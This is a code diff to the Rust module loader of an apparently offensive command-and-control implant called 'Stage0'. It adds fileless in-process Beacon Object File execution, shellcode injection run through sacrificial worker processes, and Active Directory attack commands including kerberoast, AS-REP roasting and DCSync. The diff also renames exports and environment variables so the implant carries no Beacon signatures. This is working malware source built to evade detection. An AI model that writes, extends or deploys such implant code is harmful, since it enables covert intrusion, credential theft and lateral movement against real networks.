@@ -1,8 +1,12 @@
 // Stage0 module loader (L2).
 //
 // Pipeline: stage (CKMS bytes) → verify HMAC → load
-//   Product modules (desktop / iso_host / inject):
-//     register with ModuleSupervisor only — NEVER Manual-Map / LoadLibrary / mod_invoke.
+//   Classic BOF module (`bof`, cupcake-mod-bof):
+//     Manual-Map in-process (fileless) → mod_invoke("bof_exec") runs COFF in the
+//     agent process. Staged on demand so Stage0 carries no BOF/Beacon signatures.
+//   Product worker modules (inject / ad):
+//     register with ModuleSupervisor only — NEVER mapped into Stage0; spawned as
+//     self-contained sacrificial worker EXEs under a Job Object.
 //   Non-product / legacy test modules:
 //     Manual-Map / short disk LoadLibrary → mod_invoke → unload.
 //
@@ -13,15 +17,9 @@ use crate::module_package::{self, unpack_and_verify};
 use crate::types::CommandResult;
 use log::{debug, info};
 use serde::{Deserialize, Serialize};
-use std::cell::RefCell;
 use std::collections::HashMap;
 use std::path::PathBuf;
 use std::sync::{Mutex, OnceLock};
-
-// Last desktop auto-RDP enable summary (set during load_product_worker).
-thread_local! {
-    static LAST_DESKTOP_RDP_REPORT: RefCell<Option<String>> = RefCell::new(None);
-}
 
 /// Logical module identifiers (server module_id).
 pub const MOD_SHELL: &str = "shell";
@@ -29,20 +27,67 @@ pub const MOD_FS: &str = "fs";
 pub const MOD_PROC: &str = "proc";
 pub const MOD_SOCKS: &str = "socks";
 pub const MOD_PLUGIN: &str = "plugin";
+/// Classic in-process BOF engine (cupcake-mod-bof) — Manual-Map, fileless.
 pub const MOD_BOF: &str = "bof";
-pub const MOD_DOTNET: &str = "dotnet";
-/// Remote process shellcode inject — L2 only (`modules/inject`)
+/// Remote process shellcode inject — L2 only (`modules/inject`, self-contained worker EXE)
 pub const MOD_INJECT: &str = "inject";
-/// Sacrificial host PE (cupcake-iso-host) — staged bytes only, never LoadLibrary
-pub const MOD_ISO_HOST: &str = "iso_host";
-/// Remote desktop (RDP 3389 port-forward) — L2 only; Stage0 has thin Yamux DESKTOP bridge
-pub const MOD_DESKTOP: &str = "desktop";
+/// Active Directory sacrificial worker PE — L2 only (`modules/ad`); never Stage0 roast/LDAP
+pub const MOD_AD: &str = "ad";
+
+/// Design-table AD command types (docs/AD_MODULE_DESIGN.md). Explicit list — no `ad_*` glob.
+pub const AD_COMMAND_TYPES: &[&str] = &[
+    "ad_discover",
+    "ad_ldap_query",
+    "ad_enum_users",
+    "ad_enum_groups",
+    "ad_enum_privileged_groups",
+    "ad_enum_computers",
+    "ad_enum_spns",
+    "ad_enum_trusts",
+    "ad_password_policy",
+    "ad_enum_delegation",
+    "ad_enum_gpo",
+    "ad_collect_sessions",
+    "kerberoast",
+    "asrep_roast",
+    "dcsync",
+    "ad_check_replication_rights",
+    "ad_graph_collect",
+    "ad_acl_collect",
+    // Scaffold probe (worker health); not a domain attack
+    "ad_ping",
+];
+
+/// True when command_type is gated on L2 `ad` (excludes Stage0-local wipe if any).
+pub fn is_ad_command(command_type: &str) -> bool {
+    AD_COMMAND_TYPES.iter().any(|&c| c == command_type)
+}
+
+/// Windows-only product modules. These must never be staged/loaded on non-Windows.
+pub const WINDOWS_ONLY_MODULES: &[&str] = &[MOD_AD, MOD_INJECT, MOD_BOF];
+
+/// Runtime guard: is this module id allowed on the current OS?
+/// Uses compile-time cfg for Stage0 build target + explicit list.
+pub fn is_module_supported_on_current_os(mod_id: &str) -> bool {
+    let id = mod_id.to_ascii_lowercase();
+    if WINDOWS_ONLY_MODULES.iter().any(|&w| w.eq_ignore_ascii_case(&id)) {
+        #[cfg(target_os = "windows")]
+        { return true; }
+        #[cfg(not(target_os = "windows"))]
+        { return false; }
+    }
+    // Default: allow (shell/fs/proc etc. are builtin; unknown customs left to caller policy).
+    true
+}
 
 /// Map command_type → required L2 module.
 ///
 /// Daily ops (shell / file / process) are **built into** post-ex / minimal profiles —
 /// they return None (no module load). Only heavy capabilities are module-gated.
 pub fn module_for_command(command_type: &str) -> Option<&'static str> {
+    if is_ad_command(command_type) {
+        return Some(MOD_AD);
+    }
     match command_type {
         // Built-in when feature post-ex is enabled (reverse product = minimal)
         "shell"
@@ -57,27 +102,19 @@ pub fn module_for_command(command_type: &str) -> Option<&'static str> {
         | "file_mkdir"
         | "process_list"
         | "process_kill" => None,
-        // Product path uses iso_host (isolated-exec), not in-process mod_bof/mod_dotnet.
-        // Map ensure_module_for_command / auto-stage hints to the sacrificial host PE.
-        #[cfg(feature = "isolated-exec")]
-        "bof_exec" | "execute_assembly" => Some(MOD_ISO_HOST),
-        #[cfg(not(feature = "isolated-exec"))]
+        // Classic BOF: in-process mod_bof (Manual-Map, fileless). The engine is
+        // staged on demand so Stage0 ships without BOF/Beacon signatures.
         "bof_exec" => Some(MOD_BOF),
-        #[cfg(not(feature = "isolated-exec"))]
-        "execute_assembly" => Some(MOD_DOTNET),
+        // .NET execution retired — operators convert assemblies to shellcode
+        // (e.g. Donut) and use the inject module instead.
+        "execute_assembly" => None,
         "plugin_cache" | "plugin_exec" => Some(MOD_PLUGIN),
-        // Process inject: never Stage0 — always L2 mod_inject
+        // Process inject: never Stage0 — always L2 mod_inject (worker EXE)
         "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject" => Some(MOD_INJECT),
-        // Desktop control-plane (stream uses Yamux 0x0D + module Loaded gate)
-        "desktop_probe" | "desktop_start" | "desktop_stop" | "desktop_config" => Some(MOD_DESKTOP),
+        // Stage0-local artifact wipe path (no worker); no module gate
+        "ad_artifact_wipe" => None,
         _ => None,
     }
-}
-
-/// True when L2 `desktop` is worker_ready / registered (RDP DESKTOP stream may proceed).
-/// Does **not** mean a DLL is mapped into the agent process.
-pub fn desktop_module_ready() -> bool {
-    crate::module_supervisor::supervisor().is_ready(MOD_DESKTOP)
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -134,8 +171,6 @@ struct ModuleEntry {
     /// Verified PE payload (kept briefly during load)
     payload: Option<Vec<u8>>,
     loaded: Option<LoadedModule>,
-    /// Host PE bytes (iso_host) — CreateProcess only, not mapped as DLL
-    host_pe: Option<Vec<u8>>,
 }
 
 /// Process-wide module registry (Stage0).
@@ -159,7 +194,8 @@ pub fn registry() -> &'static ModuleRegistry {
     REGISTRY.get_or_init(ModuleRegistry::default)
 }
 
-/// Lock helper: recover poisoned mutex and log once.
+/// Lock helper (tests + recovery). Production paths use `.lock().ok()` / map_err.
+#[cfg(test)]
 fn lock_map<'a, T>(m: &'a std::sync::Mutex<T>, what: &str) -> std::sync::MutexGuard<'a, T> {
     match m.lock() {
         Ok(g) => g,
@@ -239,13 +275,7 @@ impl ModuleRegistry {
                     .filter(|(_, e)| e.state == ModuleState::Loaded)
                     .map(|(k, e)| {
                         let mode = if crate::module_supervisor::is_product_worker_module(k) {
-                            if e.host_pe.is_some() || k == MOD_ISO_HOST || k == "iso-host" {
-                                "iso"
-                            } else {
-                                "worker"
-                            }
-                        } else if e.host_pe.is_some() {
-                            "iso"
+                            "worker"
                         } else if e.loaded.as_ref().map(|l| l.mem_mapped).unwrap_or(false) {
                             "mem"
                         } else if e.loaded.as_ref().map(|l| l.handle == 0).unwrap_or(false) {
@@ -262,9 +292,9 @@ impl ModuleRegistry {
             .unwrap_or_default()
     }
 
-    /// How a loaded module is resident: worker | iso | mem | legacy | stub | absent
+    /// How a loaded module is resident: worker | mem | legacy | stub | absent
     ///
-    /// `worker` / `iso` = not mapped into Stage0 (process-isolated or host PE only).
+    /// `worker` = not mapped into Stage0 (process-isolated worker EXE).
     pub fn load_mode_of(&self, id: &str) -> &'static str {
         self.entries
             .lock()
@@ -275,13 +305,7 @@ impl ModuleRegistry {
                         return "absent";
                     }
                     if crate::module_supervisor::is_product_worker_module(id) {
-                        if e.host_pe.is_some() || id == MOD_ISO_HOST || id == "iso-host" {
-                            return "iso";
-                        }
                         return "worker";
-                    }
-                    if e.host_pe.is_some() {
-                        return "iso";
                     }
                     match e.loaded.as_ref() {
                         Some(l) if l.mem_mapped => "mem",
@@ -334,10 +358,9 @@ impl ModuleRegistry {
             let e = g
                 .get_mut(id)
                 .ok_or_else(|| format!("module_required:{id}"))?;
-            // Already resident: in-process PE, host PE, or product worker registration
+            // Already resident: in-process PE or product worker registration
             if e.state == ModuleState::Loaded
                 && (e.loaded.is_some()
-                    || e.host_pe.is_some()
                     || crate::module_supervisor::is_product_worker_module(id))
             {
                 return Ok(());
@@ -373,9 +396,19 @@ impl ModuleRegistry {
         }
 
         // ── Product workers: NEVER map into Stage0 ──────────────────────────
-        // desktop / inject / iso_host → ModuleSupervisor only.
+        // inject / ad → ModuleSupervisor only (self-contained worker EXEs).
         if crate::module_supervisor::is_product_worker_module(id) {
             return self.load_product_worker(id, payload);
+        }
+
+        // Legacy in-process .NET runtime retired — operators use shellcode + inject.
+        if matches!(
+            id,
+            "dotnet" | "mod_dotnet" | "cupcake_mod_dotnet"
+        ) {
+            return Err(format!(
+                "module forbidden: {id} (.NET runtime retired; convert assembly to shellcode and use module inject)"
+            ));
         }
 
         // Hosted/test payload: magic "HOST" + nothing — mark loaded without PE
@@ -398,11 +431,14 @@ impl ModuleRegistry {
                 mod_free: None,
                 mod_shutdown: None,
             });
-            e.host_pe = None;
             info!("[module_loader] loaded hosted stub module {}", id);
             return Ok(());
         }
 
+        crate::utils::db_print(&format!(
+            "[module_loader] mapping module {id}: {} bytes",
+            payload.len()
+        ));
         let loaded = map_pe_module(&payload).map_err(|e| {
             let mut g = self.entries.lock().ok();
             if let Some(ref mut g) = g {
@@ -412,6 +448,10 @@ impl ModuleRegistry {
             }
             e
         })?;
+        crate::utils::db_print(&format!(
+            "[module_loader] mapped module {id}: base=0x{:X} mem_mapped={}",
+            loaded.handle, loaded.mem_mapped
+        ));
 
         // Zeroize PE bytes after map (best-effort; local copy only)
         let mut payload = payload;
@@ -420,12 +460,14 @@ impl ModuleRegistry {
         }
         drop(payload);
 
-        // mod_init
+        // init entry (x0)
         if let Some(init) = loaded.mod_init {
+            crate::utils::db_print(&format!("[module_loader] calling mod_init (x0) for {id}"));
             let rc = unsafe { init() };
+            crate::utils::db_print(&format!("[module_loader] mod_init rc={} for {id}", rc));
             if rc != 0 {
                 let _ = unmap_loaded(&loaded);
-                return Err(format!("mod_init failed rc={rc}"));
+                return Err(format!("module init failed rc={rc}"));
             }
         }
 
@@ -447,13 +489,12 @@ impl ModuleRegistry {
         Ok(())
     }
 
-    /// Product path: verify already done; store PE for CreateProcess / capability gate only.
+    /// Product path: verify already done; register worker PE with supervisor
+    /// (CreateProcess-capable EXE; never mapped into Stage0).
     fn load_product_worker(&self, id: &str, payload: Vec<u8>) -> Result<(), String> {
         if payload.len() < 64 || payload[0] != b'M' || payload[1] != b'Z' {
             return Err(format!("product module {id} payload is not a PE"));
         }
-
-        let is_host = matches!(id, MOD_ISO_HOST | "iso-host");
 
         // Register with supervisor (state = worker_ready; no map)
         crate::module_supervisor::supervisor()
@@ -476,38 +517,17 @@ impl ModuleRegistry {
         e.staged = None;
         e.payload = None;
         e.loaded = None; // never holds a mapped handle for product modules
-        if is_host {
-            e.host_pe = Some(payload);
-            info!(
-                "[module_loader] product worker {} registered (iso host PE, not mapped)",
-                id
-            );
-        } else {
-            // desktop / inject: PE kept only in supervisor; Stage0 has no image mapping
-            e.host_pe = None;
-            // zeroize local copy — supervisor has its own clone
-            let mut payload = payload;
-            for b in payload.iter_mut() {
-                *b = 0;
-            }
-            drop(payload);
-            info!(
-                "[module_loader] product worker {} registered (worker_ready, not mapped)",
-                id
-            );
+        // zeroize local copy — supervisor has its own clone
+        let mut payload = payload;
+        for b in payload.iter_mut() {
+            *b = 0;
         }
-        // Drop lock before side effects (RDP enable may block briefly).
+        drop(payload);
         drop(g);
-
-        // desktop: enable local TermService / 3389 so bridge can dial 127.0.0.1:3389
-        if id == MOD_DESKTOP {
-            let rep = crate::rdp_enable::enable_local_rdp_on_desktop_load();
-            info!("[module_loader] {}", rep.summary_line());
-            // Stash last report for handle_module_stage message (thread-local best-effort).
-            LAST_DESKTOP_RDP_REPORT.with(|c| {
-                *c.borrow_mut() = Some(rep.summary_line());
-            });
-        }
+        info!(
+            "[module_loader] product worker {} registered (worker_ready, not mapped)",
+            id
+        );
         Ok(())
     }
 
@@ -544,7 +564,7 @@ impl ModuleRegistry {
             }
             let inv = loaded
                 .mod_invoke
-                .ok_or_else(|| format!("mod_invoke missing: {id}"))?;
+                .ok_or_else(|| format!("module invoke missing: {id}"))?;
             (inv, loaded.mod_free)
         };
 
@@ -562,7 +582,7 @@ impl ModuleRegistry {
             )
         };
         if rc != 0 {
-            return Err(format!("mod_invoke rc={rc}"));
+            return Err(format!("module invoke rc={rc}"));
         }
         if out_ptr.is_null() || out_len == 0 {
             return Ok(CommandResult {
@@ -579,14 +599,14 @@ impl ModuleRegistry {
                 unsafe { free(out_ptr, out_len) };
             }
             return Err(format!(
-                "mod_invoke out_len={out_len} exceeds sanity cap {MAX_MODULE_OUT}"
+                "module invoke out_len={out_len} exceeds sanity cap {MAX_MODULE_OUT}"
             ));
         }
         let bytes = unsafe { std::slice::from_raw_parts(out_ptr, out_len as usize) }.to_vec();
         if let Some(free) = free_fn {
             unsafe { free(out_ptr, out_len) };
         } else {
-            // Best-effort: module should export mod_free
+            // Best-effort: module should export the free entry (x2)
             unsafe {
                 let _ = Box::from_raw(std::ptr::slice_from_raw_parts_mut(
                     out_ptr,
@@ -615,11 +635,6 @@ impl ModuleRegistry {
                 }
                 let _ = unmap_loaded(&loaded);
             }
-            if let Some(mut pe) = e.host_pe.take() {
-                for b in pe.iter_mut() {
-                    *b = 0;
-                }
-            }
             e.state = ModuleState::Absent;
             e.staged = None;
             e.payload = None;
@@ -641,17 +656,6 @@ fn empty_entry(id: &str) -> ModuleEntry {
         staged: None,
         payload: None,
         loaded: None,
-        host_pe: None,
-    }
-}
-
-impl ModuleRegistry {
-    /// Host PE for isolated spawn (clone).
-    pub fn get_host_pe(&self, id: &str) -> Option<Vec<u8>> {
-        self.entries
-            .lock()
-            .ok()
-            .and_then(|g| g.get(id).and_then(|e| e.host_pe.clone()))
     }
 }
 
@@ -726,6 +730,9 @@ fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
                     return Err(format!("mem-map strict: {e}"));
                 }
                 log::warn!("[module_loader] mem-map failed, fallback LoadLibrary: {e}");
+                crate::utils::db_print(&format!(
+                    "[module_loader] mem-map failed, fallback LoadLibrary: {e}"
+                ));
             }
         }
     }
@@ -841,20 +848,21 @@ fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
         }
     }
 
+    // Neutral ABI names: x0=init, x1=invoke, x2=free, x3=shutdown (see modules/bof).
     let mod_init =
-        unsafe { resolve(get_proc, handle, b"mod_init").map(|a| std::mem::transmute(a)) };
+        unsafe { resolve(get_proc, handle, b"x0").map(|a| std::mem::transmute(a)) };
     let mod_invoke =
-        unsafe { resolve(get_proc, handle, b"mod_invoke").map(|a| std::mem::transmute(a)) };
+        unsafe { resolve(get_proc, handle, b"x1").map(|a| std::mem::transmute(a)) };
     let mod_free =
-        unsafe { resolve(get_proc, handle, b"mod_free").map(|a| std::mem::transmute(a)) };
+        unsafe { resolve(get_proc, handle, b"x2").map(|a| std::mem::transmute(a)) };
     let mod_shutdown =
-        unsafe { resolve(get_proc, handle, b"mod_shutdown").map(|a| std::mem::transmute(a)) };
+        unsafe { resolve(get_proc, handle, b"x3").map(|a| std::mem::transmute(a)) };
 
     if mod_invoke.is_none() {
         unsafe {
             free_lib(handle);
         }
-        return Err("export mod_invoke not found".into());
+        return Err("required export missing".into());
     }
 
     // Keep free_lib via handle; FreeLibrary on unload
@@ -970,10 +978,20 @@ fn unmap_loaded(loaded: &LoadedModule) -> Result<(), String> {
 }
 
 /// Ensure command's module is loaded; fails with module_required if absent/not staged.
+/// Also performs a hard platform gate: on non-Windows we refuse to request windows-only
+/// modules (ad, inject, bof). This prevents display/start mismatches.
 pub fn ensure_module_for_command(command_type: &str) -> Result<(), String> {
     let Some(mod_id) = module_for_command(command_type) else {
         return Ok(());
     };
+    // Runtime OS gate (defense in depth — even if server filtered, a misrouted command is rejected locally)
+    if !is_module_supported_on_current_os(mod_id) {
+        return Err(format!(
+            "module_unsupported_on_os:{}:current_os={}",
+            mod_id,
+            std::env::consts::OS
+        ));
+    }
     if registry().is_loaded(mod_id) {
         return Ok(());
     }
@@ -989,6 +1007,19 @@ pub fn ensure_module_for_command(command_type: &str) -> Result<(), String> {
 }
 
 /// Optional L2 shell module invoke (legacy/experimental). Daily reverse uses built-in post-ex.
+
+/// Guard staging / load of a module id against current OS.
+/// Returns Err if the module is known to be unsupported here (e.g. ad/inject on linux).
+pub fn ensure_module_supported(mod_id: &str) -> Result<(), String> {
+    if !is_module_supported_on_current_os(mod_id) {
+        return Err(format!(
+            "module_unsupported_on_os:{}:current_os={}",
+            mod_id,
+            std::env::consts::OS
+        ));
+    }
+    Ok(())
+}
 pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
     if !registry().is_loaded(MOD_SHELL) {
         return Err("module_required:shell".into());
@@ -997,8 +1028,8 @@ pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
 }
 
 /// Invoke loaded `bof` module with base64 COFF + optional base64 args (JSON envelope).
-/// Legacy in-process BOF entry point. Product builds must use isolated-exec.
-#[cfg(not(feature = "isolated-exec"))]
+/// Classic BOF path: COFF executes **in the agent process** via mod_bof (Manual-Mapped,
+/// fileless, no sacrificial process).
 pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
     ensure_module_for_command("bof_exec")?;
     let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, coff);
@@ -1011,22 +1042,8 @@ pub fn invoke_bof(coff: &[u8], args: &[u8]) -> Result<CommandResult, String> {
     registry().invoke(MOD_BOF, "bof_exec", &bytes)
 }
 
-/// Invoke loaded `dotnet` module with assembly bytes + string args.
-/// Legacy in-process .NET entry point. Product builds must use isolated-exec.
-#[cfg(not(feature = "isolated-exec"))]
-pub fn invoke_dotnet(assembly: &[u8], args: &[String]) -> Result<CommandResult, String> {
-    ensure_module_for_command("execute_assembly")?;
-    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, assembly);
-    let payload = serde_json::json!({
-        "data": data_b64,
-        "args": args,
-    });
-    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
-    registry().invoke(MOD_DOTNET, "execute_assembly", &bytes)
-}
-
-/// Invoke inject via **iso_host worker process** (KIND_INJECT).
-/// Stage0 never maps inject DLL or calls mod_invoke for inject.
+/// Invoke inject via **inject worker process** (self-contained worker EXE).
+/// Stage0 never maps inject logic in-process.
 pub fn invoke_inject(
     pid: u32,
     shellcode: &[u8],
@@ -1048,21 +1065,20 @@ pub fn invoke_inject(
 /// Inject with a pre-built JSON body — always process-isolated worker path.
 pub fn invoke_inject_json(cmd_type: &str, json_body: &[u8]) -> Result<CommandResult, String> {
     ensure_module_for_command(cmd_type)?;
-    // Product isolation: never registry().invoke(MOD_INJECT) — that would require
-    // an in-process mapped DLL. Route through ModuleSupervisor → iso_host KIND=3.
+    // Product isolation: never registry().invoke(MOD_INJECT) — that would map an
+    // in-process DLL. Route through ModuleSupervisor → self-contained worker EXE.
     if !registry().is_loaded(MOD_INJECT)
         && !crate::module_supervisor::supervisor().is_ready(MOD_INJECT)
     {
         return Err(format!("module_required:{MOD_INJECT}"));
     }
-    // iso_host PE must be staged for the sacrificial worker
-    if registry().get_host_pe(MOD_ISO_HOST).is_none()
-        && crate::module_supervisor::supervisor()
-            .get_pe(MOD_ISO_HOST)
-            .is_none()
+    // The staged inject module PE doubles as the sacrificial worker host.
+    if crate::module_supervisor::supervisor()
+        .get_pe(MOD_INJECT)
+        .is_none()
     {
         return Err(format!(
-            "module_required:{MOD_ISO_HOST} (inject runs in iso_host worker)"
+            "module_required:{MOD_INJECT} (worker PE missing)"
         ));
     }
     let deadline_ms = 60_000u64;
@@ -1074,6 +1090,10 @@ pub fn invoke_inject_json(cmd_type: &str, json_body: &[u8]) -> Result<CommandRes
 }
 
 /// Handle module_stage / module_push: id from path/content, data = base64 CKMS.
+///
+/// For product worker modules (`inject` / `ad`), success means PE bytes are cached
+/// for on-demand CreateProcess — **not** a long-lived resident process. UI should
+/// treat this as "staged/ready", not "process alive".
 pub fn handle_module_stage(id: &str, b64_or_raw: &[u8], is_base64: bool) -> Result<String, String> {
     let blob = if is_base64 {
         base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64_or_raw)
@@ -1083,14 +1103,8 @@ pub fn handle_module_stage(id: &str, b64_or_raw: &[u8], is_base64: bool) -> Resu
     };
     registry().stage_bytes(id, &blob)?;
     registry().load(id)?;
-    let mut msg = format!("module {id} staged+loaded");
-    if id == MOD_DESKTOP {
-        if let Some(rdp) = LAST_DESKTOP_RDP_REPORT.with(|c| c.borrow_mut().take()) {
-            msg.push_str(" | ");
-            msg.push_str(&rdp);
-        }
-    }
-    Ok(msg)
+    let mode = registry().load_mode_of(id);
+    Ok(format!("module {id} staged+loaded mode={mode}"))
 }
 
 /// Stage0 OPSEC: startup delay with jitter before first connect.
@@ -1134,17 +1148,10 @@ mod tests {
         assert_eq!(module_for_command("process_list"), None);
         assert_eq!(module_for_command("register"), None);
         // Heavy capabilities remain module-gated
-        // Product path (isolated-exec): stage iso_host, not in-process mod_bof/mod_dotnet
-        #[cfg(feature = "isolated-exec")]
-        {
-            assert_eq!(module_for_command("bof_exec"), Some(MOD_ISO_HOST));
-            assert_eq!(module_for_command("execute_assembly"), Some(MOD_ISO_HOST));
-        }
-        #[cfg(not(feature = "isolated-exec"))]
-        {
-            assert_eq!(module_for_command("bof_exec"), Some(MOD_BOF));
-            assert_eq!(module_for_command("execute_assembly"), Some(MOD_DOTNET));
-        }
+        // Classic BOF: always gated on in-process mod_bof (Manual-Map, fileless)
+        assert_eq!(module_for_command("bof_exec"), Some(MOD_BOF));
+        // .NET execution retired — no module gate; handler directs to shellcode+inject
+        assert_eq!(module_for_command("execute_assembly"), None);
         assert_eq!(module_for_command("plugin_exec"), Some(MOD_PLUGIN));
         assert_eq!(module_for_command("process_inject"), Some(MOD_INJECT));
         assert_eq!(module_for_command("shellcode_inject"), Some(MOD_INJECT));
@@ -1187,14 +1194,14 @@ mod tests {
     }
 
     /// Optional PE load: set CUPCAKE_TEST_MOD_SHELL to path of cupcake_mod_shell.dll
-    /// Uses LoadLibrary path (CUPCAKE_MEM_MAP=0) so CRT/TLS is handled by OS loader.
+    /// Uses LoadLibrary path (APP_MEM_MAP=0) so CRT/TLS is handled by OS loader.
     /// Isolated: clears strict env; always unload + clear key even on failure mid-test.
     #[test]
     fn load_real_shell_dll_if_present() {
         let _g = test_lock();
         // Isolate from other tests that toggle mem-map flags
-        std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
-        std::env::set_var("CUPCAKE_MEM_MAP", "0");
+        std::env::remove_var("APP_MEM_MAP_STRICT");
+        std::env::set_var("APP_MEM_MAP", "0");
         let path = match std::env::var("CUPCAKE_TEST_MOD_SHELL") {
             Ok(p) if !p.is_empty() => p,
             _ => {
@@ -1211,7 +1218,7 @@ mod tests {
                     Some(p) => p.to_string_lossy().into_owned(),
                     None => {
                         eprintln!("skip: no mod_shell dll (set CUPCAKE_TEST_MOD_SHELL)");
-                        std::env::remove_var("CUPCAKE_MEM_MAP");
+                        std::env::remove_var("APP_MEM_MAP");
                         return;
                     }
                 }
@@ -1221,13 +1228,13 @@ mod tests {
             Ok(b) => b,
             Err(e) => {
                 eprintln!("skip read {path}: {e}");
-                std::env::remove_var("CUPCAKE_MEM_MAP");
+                std::env::remove_var("APP_MEM_MAP");
                 return;
             }
         };
         if pe.len() < 64 || pe[0] != b'M' {
             eprintln!("skip: not PE");
-            std::env::remove_var("CUPCAKE_MEM_MAP");
+            std::env::remove_var("APP_MEM_MAP");
             return;
         }
         let key = default_module_key();
@@ -1241,7 +1248,7 @@ mod tests {
         if let Err(e) = load_res {
             let _ = registry().unload(id);
             registry().set_key_override(None);
-            std::env::remove_var("CUPCAKE_MEM_MAP");
+            std::env::remove_var("APP_MEM_MAP");
             panic!("load PE module failed: {e}");
         }
         assert!(registry().is_loaded(id));
@@ -1271,7 +1278,7 @@ mod tests {
         registry().unload(id).expect("unload");
         assert!(!registry().is_loaded(id));
         registry().set_key_override(None);
-        std::env::remove_var("CUPCAKE_MEM_MAP");
+        std::env::remove_var("APP_MEM_MAP");
         eprintln!("OK real PE load+invoke(help+echo)+unload via {path} load_mode={mode}");
     }
 
@@ -1317,8 +1324,8 @@ mod tests {
         let _g = test_lock();
         #[cfg(all(windows, feature = "mem-map"))]
         {
-            std::env::set_var("CUPCAKE_MEM_MAP_STRICT", "1");
-            std::env::set_var("CUPCAKE_MEM_MAP", "1");
+            std::env::set_var("APP_MEM_MAP_STRICT", "1");
+            std::env::set_var("APP_MEM_MAP", "1");
             let tmp = std::env::temp_dir();
             let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                 .into_iter()
@@ -1397,7 +1404,7 @@ mod tests {
             );
 
             registry().set_key_override(None);
-            std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
+            std::env::remove_var("APP_MEM_MAP_STRICT");
         }
     }
 
@@ -1410,25 +1417,23 @@ mod tests {
         }
         let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
         [
-            root.join("../../server/storage/modules/inject.bin"),
-            root.join("../../server/storage/modules/desktop.bin"),
-            root.join("../target/release/cupcake_mod_inject.dll"),
-            root.join("../target/release/cupcake_mod_desktop.dll"),
-            PathBuf::from("server/storage/modules/inject.bin"),
-            PathBuf::from("server/storage/modules/desktop.bin"),
+            root.join("../../server/storage/modules/bof.bin"),
+            root.join("../target/release/app_rt.dll"),
+            root.join("../target/release/cupcake_mod_bof.dll"),
+            PathBuf::from("server/storage/modules/bof.bin"),
         ]
         .into_iter()
         .find(|p| p.is_file())
     }
 
-    /// Stage product L2 PE with mem-map (inject/desktop — never shell.bin).
+    /// Stage product L2 PE with mem-map (inject — never shell.bin).
     #[test]
     fn stage_product_bin_from_storage_if_present() {
         let _g = test_lock();
-        std::env::remove_var("CUPCAKE_MEM_MAP_STRICT");
-        std::env::remove_var("CUPCAKE_MEM_MAP");
+        std::env::remove_var("APP_MEM_MAP_STRICT");
+        std::env::remove_var("APP_MEM_MAP");
         let Some(path) = find_product_l2_pe() else {
-            eprintln!("skip: no product L2 PE (inject/desktop); set CUPCAKE_TEST_MOD_PE");
+            eprintln!("skip: no product L2 PE (inject); set CUPCAKE_TEST_MOD_PE");
             return;
         };
         let pe = std::fs::read(&path).expect("read product pe");
